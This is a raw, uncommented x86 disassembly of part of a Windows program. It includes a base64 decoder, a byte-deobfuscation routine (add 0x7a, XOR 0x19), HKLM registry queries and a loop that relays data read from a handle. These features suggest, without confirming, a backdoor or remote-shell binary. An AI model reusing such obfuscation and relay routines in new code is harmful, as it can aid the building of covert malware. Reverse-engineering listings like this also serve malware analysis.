  407fe1:	81 c4 78 01 00 00    	add    $0x178,%esp
  407fe7:	c2 04 00             	ret    $0x4
  407fea:	90                   	nop
  407feb:	90                   	nop
  407fec:	90                   	nop
  407fed:	90                   	nop
  407fee:	90                   	nop
  407fef:	90                   	nop
  407ff0:	56                   	push   %esi
  407ff1:	8b f1                	mov    %ecx,%esi
  407ff3:	e8 18 00 00 00       	call   0x408010
  407ff8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  407ffd:	74 09                	je     0x408008
  407fff:	56                   	push   %esi
  408000:	e8 e1 26 00 00       	call   0x40a6e6
  408005:	83 c4 04             	add    $0x4,%esp
  408008:	8b c6                	mov    %esi,%eax
  40800a:	5e                   	pop    %esi
  40800b:	c2 04 00             	ret    $0x4
  40800e:	90                   	nop
  40800f:	90                   	nop
  408010:	56                   	push   %esi
  408011:	8b f1                	mov    %ecx,%esi
  408013:	57                   	push   %edi
  408014:	8b 3d e0 b1 40 00    	mov    0x40b1e0,%edi
  40801a:	8b 46 28             	mov    0x28(%esi),%eax
  40801d:	6a 00                	push   $0x0
  40801f:	50                   	push   %eax
  408020:	c7 06 dc b4 40 00    	movl   $0x40b4dc,(%esi)
  408026:	ff d7                	call   *%edi
  408028:	8b 4e 20             	mov    0x20(%esi),%ecx
  40802b:	6a 00                	push   $0x0
  40802d:	51                   	push   %ecx
  40802e:	ff 15 a0 b1 40 00    	call   *0x40b1a0
  408034:	8b 56 24             	mov    0x24(%esi),%edx
  408037:	6a 00                	push   $0x0
  408039:	52                   	push   %edx
  40803a:	ff d7                	call   *%edi
  40803c:	8b 46 2c             	mov    0x2c(%esi),%eax
  40803f:	68 d0 07 00 00       	push   $0x7d0
  408044:	50                   	push   %eax
  408045:	ff 15 dc b1 40 00    	call   *0x40b1dc
  40804b:	8b 4e 2c             	mov    0x2c(%esi),%ecx
  40804e:	6a 00                	push   $0x0
  408050:	51                   	push   %ecx
  408051:	ff d7                	call   *%edi
  408053:	8b 46 10             	mov    0x10(%esi),%eax
  408056:	8b 3d 9c b1 40 00    	mov    0x40b19c,%edi
  40805c:	85 c0                	test   %eax,%eax
  40805e:	74 03                	je     0x408063
  408060:	50                   	push   %eax
  408061:	ff d7                	call   *%edi
  408063:	8b 46 14             	mov    0x14(%esi),%eax
  408066:	85 c0                	test   %eax,%eax
  408068:	74 03                	je     0x40806d
  40806a:	50                   	push   %eax
  40806b:	ff d7                	call   *%edi
  40806d:	8b 46 18             	mov    0x18(%esi),%eax
  408070:	85 c0                	test   %eax,%eax
  408072:	74 03                	je     0x408077
  408074:	50                   	push   %eax
  408075:	ff d7                	call   *%edi
  408077:	8b 46 1c             	mov    0x1c(%esi),%eax
  40807a:	85 c0                	test   %eax,%eax
  40807c:	74 03                	je     0x408081
  40807e:	50                   	push   %eax
  40807f:	ff d7                	call   *%edi
  408081:	8b 56 10             	mov    0x10(%esi),%edx
  408084:	8b 3d e4 b1 40 00    	mov    0x40b1e4,%edi
  40808a:	52                   	push   %edx
  40808b:	ff d7                	call   *%edi
  40808d:	8b 46 14             	mov    0x14(%esi),%eax
  408090:	50                   	push   %eax
  408091:	ff d7                	call   *%edi
  408093:	8b 4e 18             	mov    0x18(%esi),%ecx
  408096:	51                   	push   %ecx
  408097:	ff d7                	call   *%edi
  408099:	8b 56 1c             	mov    0x1c(%esi),%edx
  40809c:	52                   	push   %edx
  40809d:	ff d7                	call   *%edi
  40809f:	8b 46 20             	mov    0x20(%esi),%eax
  4080a2:	50                   	push   %eax
  4080a3:	ff d7                	call   *%edi
  4080a5:	8b 4e 24             	mov    0x24(%esi),%ecx
  4080a8:	51                   	push   %ecx
  4080a9:	ff d7                	call   *%edi
  4080ab:	8b 56 2c             	mov    0x2c(%esi),%edx
  4080ae:	52                   	push   %edx
  4080af:	ff d7                	call   *%edi
  4080b1:	8b 46 28             	mov    0x28(%esi),%eax
  4080b4:	50                   	push   %eax
  4080b5:	ff d7                	call   *%edi
  4080b7:	8b ce                	mov    %esi,%ecx
  4080b9:	e8 b2 de ff ff       	call   0x405f70
  4080be:	5f                   	pop    %edi
  4080bf:	5e                   	pop    %esi
  4080c0:	c3                   	ret
  4080c1:	90                   	nop
  4080c2:	90                   	nop
  4080c3:	90                   	nop
  4080c4:	90                   	nop
  4080c5:	90                   	nop
  4080c6:	90                   	nop
  4080c7:	90                   	nop
  4080c8:	90                   	nop
  4080c9:	90                   	nop
  4080ca:	90                   	nop
  4080cb:	90                   	nop
  4080cc:	90                   	nop
  4080cd:	90                   	nop
  4080ce:	90                   	nop
  4080cf:	90                   	nop
  4080d0:	8b 44 24 08          	mov    0x8(%esp),%eax
  4080d4:	8b 54 24 04          	mov    0x4(%esp),%edx
  4080d8:	83 f8 01             	cmp    $0x1,%eax
  4080db:	75 11                	jne    0x4080ee
  4080dd:	53                   	push   %ebx
  4080de:	8a 1a                	mov    (%edx),%bl
  4080e0:	80 fb 1e             	cmp    $0x1e,%bl
  4080e3:	5b                   	pop    %ebx
  4080e4:	75 08                	jne    0x4080ee
  4080e6:	e8 45 df ff ff       	call   0x406030
  4080eb:	c2 08 00             	ret    $0x8
  4080ee:	56                   	push   %esi
  4080ef:	8d 74 24 0c          	lea    0xc(%esp),%esi
  4080f3:	6a 00                	push   $0x0
  4080f5:	56                   	push   %esi
  4080f6:	50                   	push   %eax
  4080f7:	8b 41 14             	mov    0x14(%ecx),%eax
  4080fa:	52                   	push   %edx
  4080fb:	50                   	push   %eax
  4080fc:	ff 15 4c b1 40 00    	call   *0x40b14c
  408102:	5e                   	pop    %esi
  408103:	c2 08 00             	ret    $0x8
  408106:	90                   	nop
  408107:	90                   	nop
  408108:	90                   	nop
  408109:	90                   	nop
  40810a:	90                   	nop
  40810b:	90                   	nop
  40810c:	90                   	nop
  40810d:	90                   	nop
  40810e:	90                   	nop
  40810f:	90                   	nop
  408110:	81 ec 08 04 00 00    	sub    $0x408,%esp
  408116:	53                   	push   %ebx
  408117:	8b 9c 24 10 04 00 00 	mov    0x410(%esp),%ebx
  40811e:	55                   	push   %ebp
  40811f:	8b 2d a4 b1 40 00    	mov    0x40b1a4,%ebp
  408125:	56                   	push   %esi
  408126:	57                   	push   %edi
  408127:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  40812e:	00 
  40812f:	6a 64                	push   $0x64
  408131:	ff 15 c4 b0 40 00    	call   *0x40b0c4
  408137:	8d 44 24 14          	lea    0x14(%esp),%eax
  40813b:	6a 00                	push   $0x0
  40813d:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  408141:	50                   	push   %eax
  408142:	8b 43 10             	mov    0x10(%ebx),%eax
  408145:	51                   	push   %ecx
  408146:	8d 54 24 24          	lea    0x24(%esp),%edx
  40814a:	68 00 04 00 00       	push   $0x400
  40814f:	52                   	push   %edx
  408150:	50                   	push   %eax
  408151:	ff d5                	call   *%ebp
  408153:	85 c0                	test   %eax,%eax
  408155:	74 d8                	je     0x40812f
  408157:	8b 44 24 10          	mov    0x10(%esp),%eax
  40815b:	85 c0                	test   %eax,%eax
  40815d:	76 d0                	jbe    0x40812f
  40815f:	b9 00 01 00 00       	mov    $0x100,%ecx
  408164:	33 c0                	xor    %eax,%eax
  408166:	8d 7c 24 18          	lea    0x18(%esp),%edi
  40816a:	f3 ab                	rep stos %eax,%es:(%edi)
  40816c:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  408170:	51                   	push   %ecx
  408171:	6a 40                	push   $0x40
  408173:	ff 15 34 b1 40 00    	call   *0x40b134
  408179:	8b 4b 10             	mov    0x10(%ebx),%ecx
  40817c:	8b f0                	mov    %eax,%esi
  40817e:	8b 44 24 14          	mov    0x14(%esp),%eax
  408182:	8d 54 24 10          	lea    0x10(%esp),%edx
  408186:	6a 00                	push   $0x0
  408188:	52                   	push   %edx
  408189:	50                   	push   %eax
  40818a:	56                   	push   %esi
  40818b:	51                   	push   %ecx
  40818c:	ff 15 44 b1 40 00    	call   *0x40b144
  408192:	8b cb                	mov    %ebx,%ecx
  408194:	8b 54 24 10          	mov    0x10(%esp),%edx
  408198:	52                   	push   %edx
  408199:	56                   	push   %esi
  40819a:	e8 01 de ff ff       	call   0x405fa0
  40819f:	56                   	push   %esi
  4081a0:	ff 15 24 b1 40 00    	call   *0x40b124
  4081a6:	8d 44 24 14          	lea    0x14(%esp),%eax
  4081aa:	6a 00                	push   $0x0
  4081ac:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  4081b0:	50                   	push   %eax
  4081b1:	8b 43 10             	mov    0x10(%ebx),%eax
  4081b4:	51                   	push   %ecx
  4081b5:	8d 54 24 24          	lea    0x24(%esp),%edx
  4081b9:	68 00 04 00 00       	push   $0x400
  4081be:	52                   	push   %edx
  4081bf:	50                   	push   %eax
  4081c0:	ff d5                	call   *%ebp
  4081c2:	85 c0                	test   %eax,%eax
  4081c4:	75 91                	jne    0x408157
  4081c6:	e9 64 ff ff ff       	jmp    0x40812f
  4081cb:	90                   	nop
  4081cc:	90                   	nop
  4081cd:	90                   	nop
  4081ce:	90                   	nop
  4081cf:	90                   	nop
  4081d0:	83 ec 08             	sub    $0x8,%esp
  4081d3:	56                   	push   %esi
  4081d4:	8b 74 24 10          	mov    0x10(%esp),%esi
  4081d8:	6a ff                	push   $0xffffffff
  4081da:	8d 54 24 08          	lea    0x8(%esp),%edx
  4081de:	8b 46 20             	mov    0x20(%esi),%eax
  4081e1:	8b 4e 28             	mov    0x28(%esi),%ecx
  4081e4:	6a 00                	push   $0x0
  4081e6:	52                   	push   %edx
  4081e7:	6a 02                	push   $0x2
  4081e9:	89 44 24 14          	mov    %eax,0x14(%esp)
  4081ed:	89 4c 24 18          	mov    %ecx,0x18(%esp)
  4081f1:	ff 15 a8 b1 40 00    	call   *0x40b1a8
  4081f7:	8b 46 28             	mov    0x28(%esi),%eax
  4081fa:	6a 00                	push   $0x0
  4081fc:	50                   	push   %eax
  4081fd:	ff 15 e0 b1 40 00    	call   *0x40b1e0
  408203:	8b 4e 20             	mov    0x20(%esi),%ecx
  408206:	6a 01                	push   $0x1
  408208:	51                   	push   %ecx
  408209:	ff 15 a0 b1 40 00    	call   *0x40b1a0
  40820f:	8b 4e 04             	mov    0x4(%esi),%ecx
  408212:	e8 59 9f ff ff       	call   0x402170
  408217:	33 c0                	xor    %eax,%eax
  408219:	5e                   	pop    %esi
  40821a:	83 c4 08             	add    $0x8,%esp
  40821d:	c2 04 00             	ret    $0x4
  408220:	51                   	push   %ecx
  408221:	53                   	push   %ebx
  408222:	55                   	push   %ebp
  408223:	56                   	push   %esi
  408224:	8b 74 24 14          	mov    0x14(%esp),%esi
  408228:	57                   	push   %edi
  408229:	8b fe                	mov    %esi,%edi
  40822b:	83 c9 ff             	or     $0xffffffff,%ecx
  40822e:	33 c0                	xor    %eax,%eax
  408230:	f2 ae                	repnz scas %es:(%edi),%al
  408232:	f7 d1                	not    %ecx
  408234:	49                   	dec    %ecx
  408235:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  40823c:	00 
  40823d:	51                   	push   %ecx
  40823e:	ff 15 5c b2 40 00    	call   *0x40b25c
  408244:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  408248:	8b e8                	mov    %eax,%ebp
  40824a:	8a 06                	mov    (%esi),%al
  40824c:	83 c4 04             	add    $0x4,%esp
  40824f:	84 c0                	test   %al,%al
  408251:	0f 84 d0 00 00 00    	je     0x408327
  408257:	8d 7e 02             	lea    0x2(%esi),%edi
  40825a:	8b 44 24 10          	mov    0x10(%esp),%eax
  40825e:	85 c0                	test   %eax,%eax
  408260:	0f 85 c1 00 00 00    	jne    0x408327
  408266:	8a 47 fe             	mov    -0x2(%edi),%al
  408269:	50                   	push   %eax
  40826a:	e8 e1 00 00 00       	call   0x408350
  40826f:	83 c4 04             	add    $0x4,%esp
  408272:	85 c0                	test   %eax,%eax
  408274:	0f 8c ad 00 00 00    	jl     0x408327
  40827a:	8a 4f ff             	mov    -0x1(%edi),%cl
  40827d:	c1 e0 06             	shl    $0x6,%eax
  408280:	51                   	push   %ecx
  408281:	8b f0                	mov    %eax,%esi
  408283:	e8 c8 00 00 00       	call   0x408350
  408288:	83 c4 04             	add    $0x4,%esp
  40828b:	85 c0                	test   %eax,%eax
  40828d:	0f 8c 8b 00 00 00    	jl     0x40831e
  408293:	03 f0                	add    %eax,%esi
  408295:	8a 07                	mov    (%edi),%al
  408297:	c1 e6 06             	shl    $0x6,%esi
  40829a:	3c 3d                	cmp    $0x3d,%al
  40829c:	75 0a                	jne    0x4082a8
  40829e:	c7 44 24 10 01 00 00 	movl   $0x1,0x10(%esp)
  4082a5:	00 
  4082a6:	eb 0f                	jmp    0x4082b7
  4082a8:	50                   	push   %eax
  4082a9:	e8 a2 00 00 00       	call   0x408350
  4082ae:	83 c4 04             	add    $0x4,%esp
  4082b1:	85 c0                	test   %eax,%eax
  4082b3:	7c 69                	jl     0x40831e
  4082b5:	03 f0                	add    %eax,%esi
  4082b7:	8a 47 01             	mov    0x1(%edi),%al
  4082ba:	c1 e6 06             	shl    $0x6,%esi
  4082bd:	3c 3d                	cmp    $0x3d,%al
  4082bf:	8b de                	mov    %esi,%ebx
  4082c1:	75 3e                	jne    0x408301
  4082c3:	8b 44 24 10          	mov    0x10(%esp),%eax
  4082c7:	40                   	inc    %eax
  4082c8:	83 f8 03             	cmp    $0x3,%eax
  4082cb:	89 44 24 10          	mov    %eax,0x10(%esp)
  4082cf:	7d 09                	jge    0x4082da
  4082d1:	8b d3                	mov    %ebx,%edx
  4082d3:	c1 fa 10             	sar    $0x10,%edx
  4082d6:	88 55 00             	mov    %dl,0x0(%ebp)
  4082d9:	45                   	inc    %ebp
  4082da:	83 f8 02             	cmp    $0x2,%eax
  4082dd:	7d 09                	jge    0x4082e8
  4082df:	8b cb                	mov    %ebx,%ecx
  4082e1:	c1 f9 08             	sar    $0x8,%ecx
  4082e4:	88 4d 00             	mov    %cl,0x0(%ebp)
  4082e7:	45                   	inc    %ebp
  4082e8:	83 f8 01             	cmp    $0x1,%eax
  4082eb:	7d 04                	jge    0x4082f1
  4082ed:	88 5d 00             	mov    %bl,0x0(%ebp)
  4082f0:	45                   	inc    %ebp
  4082f1:	8a 47 02             	mov    0x2(%edi),%al
  4082f4:	83 c7 04             	add    $0x4,%edi
  4082f7:	84 c0                	test   %al,%al
  4082f9:	0f 85 5b ff ff ff    	jne    0x40825a
  4082ff:	eb 26                	jmp    0x408327
  408301:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  408305:	85 c9                	test   %ecx,%ecx
  408307:	75 15                	jne    0x40831e
  408309:	50                   	push   %eax
  40830a:	e8 41 00 00 00       	call   0x408350
  40830f:	83 c4 04             	add    $0x4,%esp
  408312:	85 c0                	test   %eax,%eax
  408314:	7c 08                	jl     0x40831e
  408316:	03 d8                	add    %eax,%ebx
  408318:	8b 44 24 10          	mov    0x10(%esp),%eax
  40831c:	eb b3                	jmp    0x4082d1
  40831e:	5f                   	pop    %edi
  40831f:	5e                   	pop    %esi
  408320:	5d                   	pop    %ebp
  408321:	83 c8 ff             	or     $0xffffffff,%eax
  408324:	5b                   	pop    %ebx
  408325:	59                   	pop    %ecx
  408326:	c3                   	ret
  408327:	8b 44 24 18          	mov    0x18(%esp),%eax
  40832b:	2b e8                	sub    %eax,%ebp
  40832d:	8b f5                	mov    %ebp,%esi
  40832f:	56                   	push   %esi
  408330:	50                   	push   %eax
  408331:	ff 15 70 b2 40 00    	call   *0x40b270
  408337:	8b 54 24 24          	mov    0x24(%esp),%edx
  40833b:	83 c4 08             	add    $0x8,%esp
  40833e:	89 02                	mov    %eax,(%edx)
  408340:	8b c6                	mov    %esi,%eax
  408342:	5f                   	pop    %edi
  408343:	5e                   	pop    %esi
  408344:	5d                   	pop    %ebp
  408345:	5b                   	pop    %ebx
  408346:	59                   	pop    %ecx
  408347:	c3                   	ret
  408348:	90                   	nop
  408349:	90                   	nop
  40834a:	90                   	nop
  40834b:	90                   	nop
  40834c:	90                   	nop
  40834d:	90                   	nop
  40834e:	90                   	nop
  40834f:	90                   	nop
  408350:	8a 0d 10 e4 40 00    	mov    0x40e410,%cl
  408356:	b8 10 e4 40 00       	mov    $0x40e410,%eax
  40835b:	84 c9                	test   %cl,%cl
  40835d:	74 10                	je     0x40836f
  40835f:	8a 54 24 04          	mov    0x4(%esp),%dl
  408363:	3a ca                	cmp    %dl,%cl
  408365:	74 0c                	je     0x408373
  408367:	8a 48 01             	mov    0x1(%eax),%cl
  40836a:	40                   	inc    %eax
  40836b:	84 c9                	test   %cl,%cl
  40836d:	75 f4                	jne    0x408363
  40836f:	83 c8 ff             	or     $0xffffffff,%eax
  408372:	c3                   	ret
  408373:	2d 10 e4 40 00       	sub    $0x40e410,%eax
  408378:	c3                   	ret
  408379:	90                   	nop
  40837a:	90                   	nop
  40837b:	90                   	nop
  40837c:	90                   	nop
  40837d:	90                   	nop
  40837e:	90                   	nop
  40837f:	90                   	nop
  408380:	51                   	push   %ecx
  408381:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  408385:	8d 44 24 00          	lea    0x0(%esp),%eax
  408389:	50                   	push   %eax
  40838a:	51                   	push   %ecx
  40838b:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  408392:	00 
  408393:	e8 88 fe ff ff       	call   0x408220
  408398:	83 c4 08             	add    $0x8,%esp
  40839b:	33 c9                	xor    %ecx,%ecx
  40839d:	85 c0                	test   %eax,%eax
  40839f:	7e 27                	jle    0x4083c8
  4083a1:	53                   	push   %ebx
  4083a2:	8b 54 24 04          	mov    0x4(%esp),%edx
  4083a6:	8a 1c 11             	mov    (%ecx,%edx,1),%bl
  4083a9:	80 c3 7a             	add    $0x7a,%bl
  4083ac:	88 1c 11             	mov    %bl,(%ecx,%edx,1)
  4083af:	8b 54 24 04          	mov    0x4(%esp),%edx
  4083b3:	8a 1c 11             	mov    (%ecx,%edx,1),%bl
  4083b6:	80 f3 19             	xor    $0x19,%bl
  4083b9:	88 1c 11             	mov    %bl,(%ecx,%edx,1)
  4083bc:	41                   	inc    %ecx
  4083bd:	3b c8                	cmp    %eax,%ecx
  4083bf:	7c e1                	jl     0x4083a2
  4083c1:	8b 44 24 04          	mov    0x4(%esp),%eax
  4083c5:	5b                   	pop    %ebx
  4083c6:	59                   	pop    %ecx
  4083c7:	c3                   	ret
  4083c8:	8b 44 24 00          	mov    0x0(%esp),%eax
  4083cc:	59                   	pop    %ecx
  4083cd:	c3                   	ret
  4083ce:	90                   	nop
  4083cf:	90                   	nop
  4083d0:	83 ec 10             	sub    $0x10,%esp
  4083d3:	b8 04 00 00 00       	mov    $0x4,%eax
  4083d8:	89 44 24 04          	mov    %eax,0x4(%esp)
  4083dc:	89 44 24 08          	mov    %eax,0x8(%esp)
  4083e0:	8d 44 24 00          	lea    0x0(%esp),%eax
  4083e4:	50                   	push   %eax
  4083e5:	68 5c e4 40 00       	push   $0x40e45c
  4083ea:	68 02 00 00 80       	push   $0x80000002
  4083ef:	ff 15 70 b0 40 00    	call   *0x40b070
  4083f5:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4083f9:	8d 54 24 0c          	lea    0xc(%esp),%edx
  4083fd:	51                   	push   %ecx
  4083fe:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  408402:	8d 44 24 0c          	lea    0xc(%esp),%eax
  408406:	52                   	push   %edx
  408407:	50                   	push   %eax
  408408:	6a 00                	push   $0x0
  40840a:	68 54 e4 40 00       	push   $0x40e454
  40840f:	51                   	push   %ecx
  408410:	ff 15 74 b0 40 00    	call   *0x40b074
  408416:	8b 54 24 00          	mov    0x0(%esp),%edx
  40841a:	52                   	push   %edx
  40841b:	ff 15 34 b0 40 00    	call   *0x40b034
  408421:	8b 44 24 0c          	mov    0xc(%esp),%eax
  408425:	83 c4 10             	add    $0x10,%esp
  408428:	c3                   	ret
  408429:	90                   	nop
  40842a:	90                   	nop
  40842b:	90                   	nop
  40842c:	90                   	nop
  40842d:	90                   	nop
  40842e:	90                   	nop
  40842f:	90                   	nop
  408430:	81 ec 00 04 00 00    	sub    $0x400,%esp
  408436:	33 c0                	xor    %eax,%eax
  408438:	53                   	push   %ebx
  408439:	8b 9c 24 10 04 00 00 	mov    0x410(%esp),%ebx
  408440:	8b cb                	mov    %ebx,%ecx
  408442:	56                   	push   %esi
  408443:	8b b4 24 10 04 00 00 	mov    0x410(%esp),%esi
  40844a:	8b d1                	mov    %ecx,%edx
  40844c:	57                   	push   %edi
  40844d:	8b fe                	mov    %esi,%edi
  40844f:	c1 e9 02             	shr    $0x2,%ecx
  408452:	f3 ab                	rep stos %eax,%es:(%edi)
  408454:	8b ca                	mov    %edx,%ecx
  408456:	83 e1 03             	and    $0x3,%ecx
  408459:	f3 aa                	rep stos %al,%es:(%edi)
  40845b:	b9 00 01 00 00       	mov    $0x100,%ecx
  408460:	33 c0                	xor    %eax,%eax
  408462:	8d 7c 24 0c          	lea    0xc(%esp),%edi
  408466:	f3 ab                	rep stos %eax,%es:(%edi)
  408468:	8b 84 24 10 04 00 00 	mov    0x410(%esp),%eax
  40846f:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  408473:	50                   	push   %eax
  408474:	68 c4 e1 40 00       	push   $0x40e1c4
  408479:	51                   	push   %ecx
  40847a:	ff 15 78 b3 40 00    	call   *0x40b378
  408480:	6a 00                	push   $0x0
  408482:	53                   	push   %ebx
  408483:	6a 00                	push   $0x0
  408485:	56                   	push   %esi
  408486:	6a 01                	push   $0x1
  408488:	8d 54 24 2c          	lea    0x2c(%esp),%edx
  40848c:	68 80 e2 40 00       	push   $0x40e280
  408491:	52                   	push   %edx
  408492:	68 02 00 00 80       	push   $0x80000002
  408497:	e8 d4 db ff ff       	call   0x406070
  40849c:	8b 3d c8 b0 40 00    	mov    0x40b0c8,%edi
  4084a2:	83 c4 2c             	add    $0x2c,%esp
  4084a5:	56                   	push   %esi
  4084a6:	ff d7                	call   *%edi
  4084a8:	85 c0                	test   %eax,%eax
  4084aa:	75 08                	jne    0x4084b4
  4084ac:	53                   	push   %ebx
  4084ad:	56                   	push   %esi
  4084ae:	ff 15 00 b4 40 00    	call   *0x40b400
  4084b4:	56                   	push   %esi
  4084b5:	ff d7                	call   *%edi
  4084b7:	5f                   	pop    %edi
  4084b8:	5e                   	pop    %esi
  4084b9:	5b                   	pop    %ebx
  4084ba:	81 c4 00 04 00 00    	add    $0x400,%esp
  4084c0:	c3                   	ret
  4084c1:	90                   	nop
  4084c2:	90                   	nop
  4084c3:	90                   	nop
  4084c4:	90                   	nop
  4084c5:	90                   	nop
  4084c6:	90                   	nop
  4084c7:	90                   	nop
  4084c8:	90                   	nop
  4084c9:	90                   	nop
  4084ca:	90                   	nop
  4084cb:	90                   	nop
  4084cc:	90                   	nop
  4084cd:	90                   	nop
  4084ce:	90                   	nop
  4084cf:	90                   	nop
  4084d0:	56                   	push   %esi
  4084d1:	57                   	push   %edi
  4084d2:	68 54 e6 40 00       	push   $0x40e654
  4084d7:	e8 14 11 00 00       	call   0x4095f0
  4084dc:	8b 35 d0 b0 40 00    	mov    0x40b0d0,%esi
  4084e2:	83 c4 04             	add    $0x4,%esp
  4084e5:	33 ff                	xor    %edi,%edi
  4084e7:	85 c0                	test   %eax,%eax
  4084e9:	74 29                	je     0x408514
  4084eb:	68 40 e6 40 00       	push   $0x40e640
  4084f0:	ff 15 ac b1 40 00    	call   *0x40b1ac
  4084f6:	68 34 e6 40 00       	push   $0x40e634
  4084fb:	68 28 e7 40 00       	push   $0x40e728
  408500:	89 3d 54 e6 40 00    	mov    %edi,0x40e654
  408506:	ff d6                	call   *%esi
  408508:	68 7c e1 40 00       	push   $0x40e17c
  40850d:	68 28 e7 40 00       	push   $0x40e728
  408512:	ff d6                	call   *%esi
  408514:	68 2c e6 40 00       	push   $0x40e62c
  408519:	e8 d2 10 00 00       	call   0x4095f0
  40851e:	83 c4 04             	add    $0x4,%esp
  408521:	85 c0                	test   %eax,%eax
  408523:	74 1e                	je     0x408543
  408525:	68 24 e6 40 00       	push   $0x40e624
  40852a:	68 28 e7 40 00       	push   $0x40e728
  40852f:	89 3d 2c e6 40 00    	mov    %edi,0x40e62c
  408535:	ff d6                	call   *%esi
  408537:	68 7c e1 40 00       	push   $0x40e17c
  40853c:	68 28 e7 40 00       	push   $0x40e728
  408541:	ff d6                	call   *%esi
  408543:	68 18 e6 40 00       	push   $0x40e618
  408548:	e8 a3 10 00 00       	call   0x4095f0
  40854d:	83 c4 04             	add    $0x4,%esp
  408550:	85 c0                	test   %eax,%eax
  408552:	74 1e                	je     0x408572
  408554:	68 10 e6 40 00       	push   $0x40e610
  408559:	68 28 e7 40 00       	push   $0x40e728
  40855e:	89 3d 18 e6 40 00    	mov    %edi,0x40e618
  408564:	ff d6                	call   *%esi
  408566:	68 7c e1 40 00       	push   $0x40e17c
  40856b:	68 28 e7 40 00       	push   $0x40e728
  408570:	ff d6                	call   *%esi
  408572:	68 04 e6 40 00       	push   $0x40e604
  408577:	e8 74 10 00 00       	call   0x4095f0
  40857c:	83 c4 04             	add    $0x4,%esp
  40857f:	85 c0                	test   %eax,%eax
  408581:	74 1e                	je     0x4085a1
  408583:	68 fc e5 40 00       	push   $0x40e5fc
  408588:	68 28 e7 40 00       	push   $0x40e728
  40858d:	89 3d 04 e6 40 00    	mov    %edi,0x40e604
  408593:	ff d6                	call   *%esi
  408595:	68 7c e1 40 00       	push   $0x40e17c
  40859a:	68 28 e7 40 00       	push   $0x40e728
  40859f:	ff d6                	call   *%esi
  4085a1:	68 f0 e5 40 00       	push   $0x40e5f0
  4085a6:	e8 45 10 00 00       	call   0x4095f0
  4085ab:	83 c4 04             	add    $0x4,%esp
  4085ae:	85 c0                	test   %eax,%eax
  4085b0:	74 1e                	je     0x4085d0
  4085b2:	68 e8 e5 40 00       	push   $0x40e5e8
  4085b7:	68 28 e7 40 00       	push   $0x40e728
  4085bc:	89 3d f0 e5 40 00    	mov    %edi,0x40e5f0
  4085c2:	ff d6                	call   *%esi
  4085c4:	68 7c e1 40 00       	push   $0x40e17c
  4085c9:	68 28 e7 40 00       	push   $0x40e728
  4085ce:	ff d6                	call   *%esi
  4085d0:	68 d8 e5 40 00       	push   $0x40e5d8
  4085d5:	e8 16 10 00 00       	call   0x4095f0
  4085da:	83 c4 04             	add    $0x4,%esp
  4085dd:	85 c0                	test   %eax,%eax
  4085df:	74 1e                	je     0x4085ff
  4085e1:	68 d0 e5 40 00       	push   $0x40e5d0
  4085e6:	68 28 e7 40 00       	push   $0x40e728
  4085eb:	89 3d d8 e5 40 00    	mov    %edi,0x40e5d8
  4085f1:	ff d6                	call   *%esi
  4085f3:	68 7c e1 40 00       	push   $0x40e17c
  4085f8:	68 28 e7 40 00       	push   $0x40e728
  4085fd:	ff d6                	call   *%esi
  4085ff:	68 c4 e5 40 00       	push   $0x40e5c4
  408604:	e8 e7 0f 00 00       	call   0x4095f0
  408609:	83 c4 04             	add    $0x4,%esp
  40860c:	85 c0                	test   %eax,%eax
  40860e:	74 1e                	je     0x40862e
  408610:	68 bc e5 40 00       	push   $0x40e5bc
  408615:	68 28 e7 40 00       	push   $0x40e728
  40861a:	89 3d c4 e5 40 00    	mov    %edi,0x40e5c4
  408620:	ff d6                	call   *%esi
  408622:	68 7c e1 40 00       	push   $0x40e17c
  408627:	68 28 e7 40 00       	push   $0x40e728
  40862c:	ff d6                	call   *%esi
  40862e:	68 b0 e5 40 00       	push   $0x40e5b0
  408633:	e8 b8 0f 00 00       	call   0x4095f0
  408638:	83 c4 04             	add    $0x4,%esp
  40863b:	85 c0                	test   %eax,%eax
  40863d:	74 1e                	je     0x40865d
  40863f:	68 a8 e5 40 00       	push   $0x40e5a8
  408644:	68 28 e7 40 00       	push   $0x40e728
  408649:	89 3d b0 e5 40 00    	mov    %edi,0x40e5b0
  40864f:	ff d6                	call   *%esi
  408651:	68 7c e1 40 00       	push   $0x40e17c
  408656:	68 28 e7 40 00       	push   $0x40e728
  40865b:	ff d6                	call   *%esi
  40865d:	68 98 e5 40 00       	push   $0x40e598
  408662:	e8 89 0f 00 00       	call   0x4095f0
  408667:	83 c4 04             	add    $0x4,%esp
  40866a:	85 c0                	test   %eax,%eax
  40866c:	74 1e                	je     0x40868c
  40866e:	68 90 e5 40 00       	push   $0x40e590
  408673:	68 28 e7 40 00       	push   $0x40e728
  408678:	89 3d 98 e5 40 00    	mov    %edi,0x40e598
  40867e:	ff d6                	call   *%esi
  408680:	68 7c e1 40 00       	push   $0x40e17c
  408685:	68 28 e7 40 00       	push   $0x40e728
  40868a:	ff d6                	call   *%esi
  40868c:	68 84 e5 40 00       	push   $0x40e584
  408691:	e8 5a 0f 00 00       	call   0x4095f0
  408696:	83 c4 04             	add    $0x4,%esp
  408699:	85 c0                	test   %eax,%eax
  40869b:	74 1e                	je     0x4086bb
  40869d:	68 7c e5 40 00       	push   $0x40e57c
  4086a2:	68 28 e7 40 00       	push   $0x40e728
  4086a7:	89 3d 84 e5 40 00    	mov    %edi,0x40e584
  4086ad:	ff d6                	call   *%esi
  4086af:	68 7c e1 40 00       	push   $0x40e17c
  4086b4:	68 28 e7 40 00       	push   $0x40e728
  4086b9:	ff d6                	call   *%esi
  4086bb:	68 6c e5 40 00       	push   $0x40e56c
  4086c0:	e8 2b 0f 00 00       	call   0x4095f0
  4086c5:	83 c4 04             	add    $0x4,%esp
  4086c8:	85 c0                	test   %eax,%eax
  4086ca:	74 1e                	je     0x4086ea
  4086cc:	68 64 e5 40 00       	push   $0x40e564
  4086d1:	68 28 e7 40 00       	push   $0x40e728
  4086d6:	89 3d 6c e5 40 00    	mov    %edi,0x40e56c
  4086dc:	ff d6                	call   *%esi
